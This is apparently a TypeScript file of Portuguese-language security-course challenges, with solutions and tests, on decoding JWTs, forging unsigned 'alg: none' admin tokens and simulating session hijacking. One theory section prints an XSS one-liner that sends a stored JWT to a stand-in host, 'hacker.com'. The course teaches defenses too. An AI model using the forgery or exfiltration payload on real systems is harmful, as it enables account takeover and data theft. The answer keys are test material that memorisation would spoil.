import type { Challenge, CodeChallenge, TheoryChallenge } from '@/types/challenge';

const theory9_0: TheoryChallenge = {
  id: '9.0',
  type: 'theory',
  episode: 9,
  room: '9.0',
  title: 'Episódio 9 — JWT Tokens e Session Hijacking',
  description: 'JWT é o padrão de autenticação mais usado hoje. Vamos entender como funciona, decodificar e explorar vulnerabilidades.',
  content: `
**O que é JWT (JSON Web Token)?**
JWT é um token auto-contido que carrega informações do usuário.

**Estrutura:**
\`header.payload.signature\`

**Exemplo real:**
\`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\`

**Partes:**
1. **Header:** Tipo e algoritmo (HS256, RS256)
2. **Payload:** Dados do usuário (id, nome, role)
3. **Signature:** Assinatura para garantir integridade

**Por que é popular:**
• Stateless (servidor não guarda sessão)
• Escalável
• Usado por: Google, Facebook, Netflix, etc

**Vulnerabilidades:**
• Algoritmo "none" aceito
• Chave secreta fraca
• Sem validação de expiração

Vamos explorar!

**Ferramentas novas neste episódio**
• Você vai usar \`import base64\` e \`import json\` no Python (módulos prontos, importados no topo do código, como nos episódios de Base64 e de APIs). Se precisar rever, volte a essas salas.
• No JavaScript, continue usando \`atob()\`/\`btoa()\` e \`JSON.parse()\`/\`JSON.stringify()\`, que não precisam de import.
  `,
};

const code9_1: CodeChallenge = {
  id: '9.1',
  type: 'code',
  episode: 9,
  room: '9.1',
  title: 'Decodificando um JWT',
  description: 'JWT parece código aleatório, mas na verdade é só Base64! Escreva a função que extrai e decodifica os dados de dentro de qualquer JWT.',
  instructions: 'Complete decodificarPayloadJWT(jwt): separe o JWT em partes por ".", pegue a parte do meio (payload), decodifique de Base64 e devolva o objeto (use JSON.parse/json.loads). Cuidado: talvez falte padding "=" no final — calcule quantos "=" faltam para o tamanho virar múltiplo de 4, e complete antes de decodificar.',
  languages: ['javascript', 'python'],
  starterCode: {
    javascript: `function decodificarPayloadJWT(jwt) {
  const partes = jwt.split('.');
  let payloadB64 = partes[1];
  // Calcule quantos "=" faltam: (4 - payloadB64.length % 4) % 4
  // Adicione essa quantidade de "=" ao final com .repeat(quantidade)
  // Decodifique com atob() e depois JSON.parse()
  // Devolva o objeto com return
}
`,
    python: `import base64
import json

def decodificar_payload_jwt(jwt):
    partes = jwt.split('.')
    payload_b64 = partes[1]
    # Calcule quantos "=" faltam: (4 - len(payload_b64) % 4) % 4
    # Adicione essa quantidade de "=" ao final com "=" * quantidade
    # Decodifique com base64.b64decode(...).decode('utf-8') e depois json.loads()
    # Devolva o objeto com return
    pass
`,
  },
  tests: {
    fn: { javascript: 'decodificarPayloadJWT', python: 'decodificar_payload_jwt' },
    cases: [
      {
        name: 'usuário comum',
        args: ['eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SIGNATURE'],
        expected: { userId: 1, username: 'john', role: 'user' },
      },
      {
        name: 'token de admin',
        args: ['eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OSwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE'],
        expected: { userId: 999, name: 'Admin', role: 'admin' },
        hidden: true,
      },
    ],
  },
  solution: {
    javascript: `function decodificarPayloadJWT(jwt) {
  const partes = jwt.split('.');
  let payloadB64 = partes[1];
  const faltam = (4 - payloadB64.length % 4) % 4;
  payloadB64 += "=".repeat(faltam);
  return JSON.parse(atob(payloadB64));
}`,
    python: `import base64
import json

def decodificar_payload_jwt(jwt):
    partes = jwt.split('.')
    payload_b64 = partes[1]
    faltam = (4 - len(payload_b64) % 4) % 4
    payload_b64 += "=" * faltam
    return json.loads(base64.b64decode(payload_b64).decode('utf-8'))`,
  },
  explanation: `
**JWT decodificado!**

A parte do meio (payload) é só um objeto comum, em Base64. Qualquer pessoa consegue **ler** um JWT — não tem nenhum segredo nisso. O que protege o token contra ser **modificado** é a terceira parte, a signature, que não decodificamos.

**Sobre a conta do padding:** \`(4 - tamanho % 4) % 4\` calcula direto quantos "=" faltam, sem precisar de loop — o segundo \`% 4\` cobre o caso em que o tamanho já é múltiplo de 4 (aí não falta nenhum).

**Mas e se pudéssemos criar um JWT novo, com o role que quisermos?** 🤔 Próxima sala!
  `,
  hints: [
    '(4 - payloadB64.length % 4) % 4 calcula quantos "=" faltam (Python: mesma fórmula com len(...))',
    '"=".repeat(faltam) (Python: "=" * faltam) monta a string de padding de uma vez',
    'atob(payloadB64) decodifica; JSON.parse(...) transforma o texto em objeto',
  ],
  difficulty: 'medium',
};

const code9_2: CodeChallenge = {
  id: '9.2',
  type: 'code',
  episode: 9,
  room: '9.2',
  title: 'Vulnerabilidade: algoritmo "none"',
  description: 'Alguns servidores aceitam JWT com algoritmo "none" (SEM assinatura!). Isso permite MONTAR um token do zero, com qualquer payload — inclusive role: "admin".',
  instructions: 'Complete forjarJwtNone(payload): codifique payload em Base64 e monte "HEADER_B64" + "." + payloadB64 + "." (o cabeçalho { alg: "none", typ: "JWT" } já vem pronto, codificado em HEADER_B64).',
  languages: ['javascript', 'python'],
  starterCode: {
    javascript: `// Header { alg: "none", typ: "JWT" } já codificado em Base64:
const HEADER_B64 = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0";

function forjarJwtNone(payload) {
  // Codifique "payload" em Base64: btoa(JSON.stringify(payload))
  // Monte e devolva: HEADER_B64 + "." + payloadB64 + "."
  // (termina com "." porque não existe signature nenhuma)
}
`,
    python: `import base64
import json

# Header { "alg": "none", "typ": "JWT" } já codificado em Base64:
HEADER_B64 = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"

def forjar_jwt_none(payload):
    # Codifique "payload" em Base64:
    # base64.b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()
    # (o separators sem espaços deixa o JSON idêntico ao do JavaScript)
    # Monte e devolva: HEADER_B64 + "." + payload_b64 + "."
    pass
`,
  },
  tests: {
    fn: { javascript: 'forjarJwtNone', python: 'forjar_jwt_none' },
    cases: [
      {
        name: 'escala privilégio para admin',
        args: [{ userId: 1, username: 'john', role: 'admin' }],
        expected: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9.',
      },
      {
        name: 'outro usuário',
        args: [{ userId: 2, username: 'maria', role: 'admin' }],
        expected: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWFyaWEiLCJyb2xlIjoiYWRtaW4ifQ==.',
        hidden: true,
      },
    ],
  },
  solution: {
    javascript: `const HEADER_B64 = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0";

function forjarJwtNone(payload) {
  const payloadB64 = btoa(JSON.stringify(payload));
  return HEADER_B64 + "." + payloadB64 + ".";
}`,
    python: `import base64
import json

HEADER_B64 = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"

def forjar_jwt_none(payload):
    payload_b64 = base64.b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()
    return HEADER_B64 + "." + payload_b64 + "."`,
  },
  explanation: `
**VULNERABILIDADE CRÍTICA!**

**O que aconteceu:**
1. Você montou um payload com role: "admin" do zero, sem precisar de senha nenhuma
2. Usou o header de algoritmo "none" (sem assinatura)
3. Um servidor vulnerável, que aceita "none", trataria isso como um token legítimo!

**Casos reais:**
• 2015 - Auth0 tinha essa vulnerabilidade
• Várias bibliotecas JWT aceitavam "none" por padrão

**Defesa:**
• Nunca aceitar algoritmo "none"
• Validar o algoritmo esperado explicitamente no servidor
• Usar bibliotecas JWT atualizadas

**Ferramentas:**
• jwt.io (decodificar e inspecionar tokens)
• jwt_tool (automatiza esse tipo de exploração)
  `,
  hints: [
    'btoa(JSON.stringify(payload)) codifica o payload (Python: base64.b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode())',
    'O separators sem espaços em Python é essencial — sem isso, o JSON fica diferente do JavaScript e o Base64 também muda',
    'HEADER_B64 já vem pronto — você só monta HEADER_B64 + "." + payloadB64 + "."',
  ],
  difficulty: 'medium',
};

const theory9_3: TheoryChallenge = {
  id: '9.3',
  type: 'theory',
  episode: 9,
  room: '9.3',
  title: 'Session Hijacking',
  description: 'Roubando tokens JWT para sequestrar sessões de outros usuários.',
  content: `
**O que é Session Hijacking?**
Roubar o token/cookie de sessão de alguém e usar para se passar por ela.

**Métodos de roubo:**

**1. XSS (Cross-Site Scripting):**
\`<script>fetch('http://hacker.com?token=' + localStorage.getItem('jwt'))</script>\`

**2. Man-in-the-Middle (MitM):**
Interceptar tráfego em WiFi público

**3. Session Sniffing:**
Capturar pacotes de rede (Wireshark)

**4. Phishing:**
Site falso captura token

**5. Malware:**
Keylogger ou browser extension malicioso

**Consequências:**
• Hacker acessa conta da vítima
• Pode mudar senha, roubar dados
• Vítima não percebe (sessão continua ativa)

**Defesas:**
• HttpOnly cookies (JS não acessa)
• HTTPS obrigatório
• Token rotation (troca periódica)
• IP validation
• Device fingerprinting

**Próxima sala:** Simular um ataque de session hijacking!
  `,
};

const code9_4: CodeChallenge = {
  id: '9.4',
  type: 'code',
  episode: 9,
  room: '9.4',
  title: 'Simulando session hijacking',
  description: 'Você roubou um JWT de uma vítima via XSS. Só vale a pena usá-lo se o token tiver privilégios de admin — escreva a função que decide isso e simula o acesso.',
  instructions: 'Complete simularSessionHijacking(tokenRoubado, dadosConfidenciais): decodifique o payload do token. Se role não for "admin", devolva "Acesso negado: token não tem privilégios de admin.". Se for, devolva "⚠️ Session hijacking bem-sucedido!\\nDados confidenciais acessados:\\n" + uma linha "user | cpf | saldo" por item de dadosConfidenciais.',
  languages: ['javascript', 'python'],
  starterCode: {
    javascript: `function simularSessionHijacking(tokenRoubado, dadosConfidenciais) {
  // Decodifique o payload (igual à sala 9.1: split, completar padding, atob, JSON.parse)
  // Se payload.role !== "admin", devolva "Acesso negado: token não tem privilégios de admin."
  // Senão, monte as linhas "user | cpf | saldo" com .map() e junte com .join("\\n")
  // Devolva "⚠️ Session hijacking bem-sucedido!\\nDados confidenciais acessados:\\n" + as linhas
}
`,
    python: `import base64
import json

def simular_session_hijacking(token_roubado, dados_confidenciais):
    # Decodifique o payload (igual à sala 9.1: split, completar padding, b64decode, json.loads)
    # Se payload["role"] != "admin", devolva "Acesso negado: token não tem privilégios de admin."
    # Senão, monte as linhas "user | cpf | saldo" com uma list comprehension e junte com "\\n".join(...)
    # Devolva "⚠️ Session hijacking bem-sucedido!\\nDados confidenciais acessados:\\n" + as linhas
    pass
`,
  },
  tests: {
    fn: { javascript: 'simularSessionHijacking', python: 'simular_session_hijacking' },
    cases: [
      {
        name: 'token de admin acessa os dados',
        args: [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OSwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE',
          [{ user: 'joao', cpf: '111.222.333-44', saldo: 'R$ 5.000' }, { user: 'maria', cpf: '555.666.777-88', saldo: 'R$ 12.000' }],
        ],
        expected: '⚠️ Session hijacking bem-sucedido!\nDados confidenciais acessados:\njoao | 111.222.333-44 | R$ 5.000\nmaria | 555.666.777-88 | R$ 12.000',
      },
      {
        name: 'token comum é recusado',
        args: [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SIGNATURE',
          [{ user: 'joao', cpf: '111.222.333-44', saldo: 'R$ 5.000' }],
        ],
        expected: 'Acesso negado: token não tem privilégios de admin.',
      },
      {
        name: 'token de admin mas sem dados para mostrar',
        args: [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OSwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE',
          [],
        ],
        expected: '⚠️ Session hijacking bem-sucedido!\nDados confidenciais acessados:\n',
        hidden: true,
      },
    ],
  },
  solution: {
    javascript: `function simularSessionHijacking(tokenRoubado, dadosConfidenciais) {
  const partes = tokenRoubado.split('.');
  let payloadB64 = partes[1];
  const faltam = (4 - payloadB64.length % 4) % 4;
  payloadB64 += "=".repeat(faltam);
  const payload = JSON.parse(atob(payloadB64));

  if (payload.role !== "admin") {
    return "Acesso negado: token não tem privilégios de admin.";
  }
  const linhas = dadosConfidenciais.map(d => d.user + " | " + d.cpf + " | " + d.saldo);
  return "⚠️ Session hijacking bem-sucedido!\\nDados confidenciais acessados:\\n" + linhas.join("\\n");
}`,
    python: `import base64
import json

def simular_session_hijacking(token_roubado, dados_confidenciais):
    partes = token_roubado.split('.')
    payload_b64 = partes[1]
    faltam = (4 - len(payload_b64) % 4) % 4
    payload_b64 += "=" * faltam
    payload = json.loads(base64.b64decode(payload_b64).decode('utf-8'))

    if payload["role"] != "admin":
        return "Acesso negado: token não tem privilégios de admin."
    linhas = [f"{d['user']} | {d['cpf']} | {d['saldo']}" for d in dados_confidenciais]
    return "⚠️ Session hijacking bem-sucedido!\\nDados confidenciais acessados:\\n" + "\\n".join(linhas)`,
  },
  explanation: `
**ATAQUE COMPLETO!**

**O que aconteceu:**
1. Decodificamos o JWT roubado via XSS
2. Conferimos que o role era "admin" ANTES de fazer qualquer coisa com ele
3. Só então "acessamos" o endpoint confidencial

**Impacto real:**
• Acesso a dados financeiros, CPFs, saldos
• Controle total da conta da vítima

**Como empresas detectam:**
• Monitorar mudanças de IP no meio de uma sessão
• Device fingerprinting
• Análise comportamental (padrões de uso)

**Caso real:**
2020 - Zoom teve uma vulnerabilidade de session hijacking; hackers roubavam tokens de reuniões.
  `,
  hints: [
    'Reaproveite a lógica de decodificação da sala 9.1 (split, padding, atob/b64decode, JSON.parse)',
    'payload.role !== "admin" (Python: payload["role"] != "admin") decide qual caminho seguir',
    '.map(d => d.user + " | " + d.cpf + " | " + d.saldo).join("\\n") (Python: list comprehension + "\\n".join(...))',
  ],
  difficulty: 'medium',
};

const theory9_5: TheoryChallenge = {
  id: '9.5',
  type: 'theory',
  episode: 9,
  room: '9.5',
  title: 'Episódio 9 completo!',
  description: 'Você domina JWT e técnicas de session hijacking!',
  content: `
**Habilidades desbloqueadas:**
✅ JWT (estrutura, decodificação)
✅ Vulnerabilidade "algorithm: none"
✅ Session hijacking
✅ Roubo de tokens via XSS

**Conhecimento de nível intermediário:**
Você agora entende como:
• Autenticação moderna funciona
• Atacantes sequestram sessões
• Defender aplicações contra esses ataques

**Carreira - Bug Bounty:**
JWT vulnerabilities pagam MUITO bem:
• $500 - $5,000 por vulnerabilidade
• Companies: Uber, Airbnb, Twitter

**Certificações:**
• eWPT (Web Application Pentesting)
• OSWE (Offensive Security Web Expert)

**Ferramentas profissionais:**
• Burp Suite + JWT extensions
• jwt_tool
• Postman

**Próximo episódio:**
Esteganografia - escondendo dados secretos em imagens e arquivos!

Você está ficando avançado! 🔥
  `,
};

export const episode9Challenges: Challenge[] = [
  theory9_0,
  code9_1,
  code9_2,
  theory9_3,
  code9_4,
  theory9_5,
];
